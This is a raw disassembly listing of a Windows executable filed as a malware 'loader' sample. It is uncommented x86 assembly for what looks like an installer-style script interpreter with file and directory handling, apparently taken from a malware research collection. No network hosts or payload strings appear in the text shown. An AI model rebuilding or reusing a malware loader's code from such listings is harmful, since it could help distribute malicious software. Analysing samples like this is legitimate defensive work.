
malware_samples/loader/693a9860b2d4887e92be1c28fe63953e0569317936dfcc50255e494e45b6e933.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 68 9a 42 00    	mov    0x429a68,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 5c 82 40 00    	call   *0x40825c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 70 9a 42 00    	mov    0x429a70,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 60 82 40 00    	call   *0x408260
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 64 82 40 00    	call   *0x408264
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 54 80 40 00    	mov    0x408054,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 58 80 40 00    	call   *0x408058
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 68 82 40 00    	call   *0x408268
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 5c 80 40 00    	call   *0x40805c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 60 80 40 00    	call   *0x408060
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 50 80 40 00    	mov    0x408050,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 60 8a 42 00       	push   $0x428a60
  401155:	57                   	push   %edi
  401156:	ff 15 6c 82 40 00    	call   *0x40826c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 70 82 40 00    	call   *0x408270
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 88 9a 42 00       	mov    0x429a88,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 8c 9a 42 00    	cmp    0x429a8c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 8c 9a 42 00    	cmp    0x429a8c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d 88 9a 42 00    	mov    0x429a88,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 8c 9a 42 00    	cmp    0x429a8c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 8c 9a 42 00    	cmp    0x429a8c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 88 9a 42 00       	mov    0x429a88,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 8c 9a 42 00    	cmp    %esi,0x429a8c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 8c 9a 42 00    	cmp    0x429a8c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 70 9a 42 00       	mov    0x429a70,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 8c 9a 42 00    	mov    0x429a8c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 88 9a 42 00    	mov    0x429a88,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 a0 42 00       	mov    $0x42a000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 5c 52 00 00       	call   0x4065e2
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 90 9a 42 00    	mov    0x429a90,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 4c 8a 42 00    	add    %eax,0x428a4c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 34 8a 42 00    	push   0x428a34
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 4c 8a 42 00    	push   0x428a4c
  4013e4:	ff 15 48 81 40 00    	call   *0x408148
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 58 82 40 00    	call   *0x408258
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 70 9a 42 00    	mov    0x429a70,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 f8 ad 40 00       	push   $0x40adf8
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 d6 42 00 00       	call   0x405707
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 68 9a 42 00       	mov    0x429a68,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d cc             	lea    -0x34(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401453:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401456:	be 00 a0 42 00       	mov    $0x42a000,%esi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 ce                	add    %esi,%ecx
  401468:	8b f8                	mov    %eax,%edi
  40146a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40146d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401470:	c1 e7 0b             	shl    $0xb,%edi
  401473:	89 0d 54 ce 40 00    	mov    %ecx,0x40ce54
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 fe                	add    %esi,%edi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 a5 17 00 00    	ja     0x402c2f
  40148a:	ff 24 8d 41 2c 40 00 	jmp    *0x402c41(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 6f 42 00 00       	call   0x405707
  401498:	e9 05 0f 00 00       	jmp    0x4023a2
  40149d:	ff 05 2c 8a 42 00    	incl   0x428a2c
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 f6 0e 00 00    	je     0x4023a2
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 20 82 40 00    	call   *0x408220
  4014b3:	e9 ea 0e 00 00       	jmp    0x4023a2
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 6f 17 00 00       	jmp    0x402c3a
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 35 42 00 00       	call   0x405707
  4014d2:	e9 58 17 00 00       	jmp    0x402c2f
  4014d7:	53                   	push   %ebx
  4014d8:	e8 ac 18 00 00       	call   0x402d89
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 d4 80 40 00    	call   *0x4080d4
  4014f0:	e9 3a 17 00 00       	jmp    0x402c2f
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 24 82 40 00    	call   *0x408224
  4014fe:	e9 2c 17 00 00       	jmp    0x402c2f
  401503:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401506:	7f 2b                	jg     0x401533
  401508:	75 0f                	jne    0x401519
  40150a:	c1 e0 02             	shl    $0x2,%eax
  40150d:	8b 88 e0 9a 42 00    	mov    0x429ae0(%eax),%ecx
  401513:	89 88 40 9b 42 00    	mov    %ecx,0x429b40(%eax)
  401519:	6a 01                	push   $0x1
  40151b:	e8 69 18 00 00       	call   0x402d89
  401520:	59                   	pop    %ecx
  401521:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401524:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401527:	89 04 8d e0 9a 42 00 	mov    %eax,0x429ae0(,%ecx,4)
  40152e:	e9 fc 16 00 00       	jmp    0x402c2f
  401533:	c1 e0 02             	shl    $0x2,%eax
  401536:	8b 88 40 9b 42 00    	mov    0x429b40(%eax),%ecx
  40153c:	89 88 e0 9a 42 00    	mov    %ecx,0x429ae0(%eax)
  401542:	e9 e8 16 00 00       	jmp    0x402c2f
  401547:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40154a:	8d 34 85 e0 9a 42 00 	lea    0x429ae0(,%eax,4),%esi
  401551:	33 c0                	xor    %eax,%eax
  401553:	8b 0e                	mov    (%esi),%ecx
  401555:	3b cb                	cmp    %ebx,%ecx
  401557:	0f 94 c0             	sete   %al
  40155a:	23 4d dc             	and    -0x24(%ebp),%ecx
  40155d:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
  401561:	89 0e                	mov    %ecx,(%esi)
  401563:	e9 d2 16 00 00       	jmp    0x402c3a
  401568:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40156b:	ff 34 85 e0 9a 42 00 	push   0x429ae0(,%eax,4)
  401572:	57                   	push   %edi
  401573:	e9 31 16 00 00       	jmp    0x402ba9
  401578:	8b 0d 30 8a 42 00    	mov    0x428a30,%ecx
  40157e:	8b 35 28 82 40 00    	mov    0x408228,%esi
  401584:	3b cb                	cmp    %ebx,%ecx
  401586:	74 09                	je     0x401591
  401588:	ff 75 d4             	push   -0x2c(%ebp)
  40158b:	51                   	push   %ecx
  40158c:	ff d6                	call   *%esi
  40158e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401591:	8b 0d 44 8a 42 00    	mov    0x428a44,%ecx
  401597:	3b cb                	cmp    %ebx,%ecx
  401599:	0f 84 90 16 00 00    	je     0x402c2f
  40159f:	50                   	push   %eax
  4015a0:	51                   	push   %ecx
  4015a1:	ff d6                	call   *%esi
  4015a3:	e9 87 16 00 00       	jmp    0x402c2f
  4015a8:	6a f0                	push   $0xfffffff0
  4015aa:	e8 fc 17 00 00       	call   0x402dab
  4015af:	ff 75 d4             	push   -0x2c(%ebp)
  4015b2:	50                   	push   %eax
  4015b3:	ff 15 d8 80 40 00    	call   *0x4080d8
  4015b9:	85 c0                	test   %eax,%eax
  4015bb:	0f 85 6e 16 00 00    	jne    0x402c2f
  4015c1:	e9 6d 13 00 00       	jmp    0x402933
  4015c6:	6a f0                	push   $0xfffffff0
  4015c8:	e8 de 17 00 00       	call   0x402dab
  4015cd:	50                   	push   %eax
  4015ce:	89 45 08             	mov    %eax,0x8(%ebp)
  4015d1:	e8 26 4a 00 00       	call   0x405ffc
  4015d6:	8b f0                	mov    %eax,%esi
  4015d8:	3b f3                	cmp    %ebx,%esi
  4015da:	74 5a                	je     0x401636
  4015dc:	6a 5c                	push   $0x5c
  4015de:	56                   	push   %esi
  4015df:	e8 9a 49 00 00       	call   0x405f7e
  4015e4:	8b f0                	mov    %eax,%esi
  4015e6:	66 8b 3e             	mov    (%esi),%di
  4015e9:	66 89 1e             	mov    %bx,(%esi)
  4015ec:	66 3b fb             	cmp    %bx,%di
  4015ef:	75 18                	jne    0x401609
  4015f1:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4015f4:	74 13                	je     0x401609
  4015f6:	e8 52 46 00 00       	call   0x405c4d
  4015fb:	85 c0                	test   %eax,%eax
  4015fd:	74 0a                	je     0x401609
  4015ff:	ff 75 08             	push   0x8(%ebp)
  401602:	e8 cf 45 00 00       	call   0x405bd6
  401607:	eb 08                	jmp    0x401611
  401609:	ff 75 08             	push   0x8(%ebp)
  40160c:	e8 1f 46 00 00       	call   0x405c30
  401611:	3b c3                	cmp    %ebx,%eax
  401613:	74 17                	je     0x40162c
  401615:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40161a:	75 0d                	jne    0x401629
  40161c:	ff 75 08             	push   0x8(%ebp)
  40161f:	ff 15 dc 80 40 00    	call   *0x4080dc
  401625:	a8 10                	test   $0x10,%al
  401627:	75 03                	jne    0x40162c
  401629:	ff 45 fc             	incl   -0x4(%ebp)
  40162c:	66 89 3e             	mov    %di,(%esi)
  40162f:	46                   	inc    %esi
  401630:	46                   	inc    %esi
  401631:	66 3b fb             	cmp    %bx,%di
  401634:	75 a6                	jne    0x4015dc
  401636:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401639:	74 2d                	je     0x401668
  40163b:	6a e6                	push   $0xffffffe6
  40163d:	e8 e1 fd ff ff       	call   0x401423
  401642:	ff 75 08             	push   0x8(%ebp)
  401645:	68 00 50 43 00       	push   $0x435000
  40164a:	e8 33 50 00 00       	call   0x406682
  40164f:	ff 75 08             	push   0x8(%ebp)
  401652:	ff 15 e0 80 40 00    	call   *0x4080e0
  401658:	85 c0                	test   %eax,%eax
  40165a:	0f 85 cf 15 00 00    	jne    0x402c2f
  401660:	ff 45 fc             	incl   -0x4(%ebp)
  401663:	e9 c7 15 00 00       	jmp    0x402c2f
  401668:	6a f5                	push   $0xfffffff5
  40166a:	e9 87 0c 00 00       	jmp    0x4022f6
  40166f:	53                   	push   %ebx
  401670:	e8 36 17 00 00       	call   0x402dab
  401675:	50                   	push   %eax
  401676:	e8 64 53 00 00       	call   0x4069df
  40167b:	e9 ad 06 00 00       	jmp    0x401d2d
  401680:	6a d0                	push   $0xffffffd0
  401682:	e8 24 17 00 00       	call   0x402dab
  401687:	6a df                	push   $0xffffffdf
  401689:	8b f0                	mov    %eax,%esi
  40168b:	e8 1b 17 00 00       	call   0x402dab
  401690:	6a 13                	push   $0x13
  401692:	8b f8                	mov    %eax,%edi
  401694:	e8 12 17 00 00       	call   0x402dab
  401699:	57                   	push   %edi
  40169a:	56                   	push   %esi
  40169b:	ff 15 e4 80 40 00    	call   *0x4080e4
  4016a1:	85 c0                	test   %eax,%eax
  4016a3:	74 07                	je     0x4016ac
  4016a5:	6a e3                	push   $0xffffffe3
  4016a7:	e9 4a 0c 00 00       	jmp    0x4022f6
  4016ac:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4016af:	0f 84 7e 12 00 00    	je     0x402933
  4016b5:	56                   	push   %esi
  4016b6:	e8 24 53 00 00       	call   0x4069df
  4016bb:	85 c0                	test   %eax,%eax
  4016bd:	0f 84 70 12 00 00    	je     0x402933
  4016c3:	57                   	push   %edi
  4016c4:	56                   	push   %esi
  4016c5:	e8 78 4d 00 00       	call   0x406442
  4016ca:	6a e4                	push   $0xffffffe4
  4016cc:	e9 25 0c 00 00       	jmp    0x4022f6
  4016d1:	53                   	push   %ebx
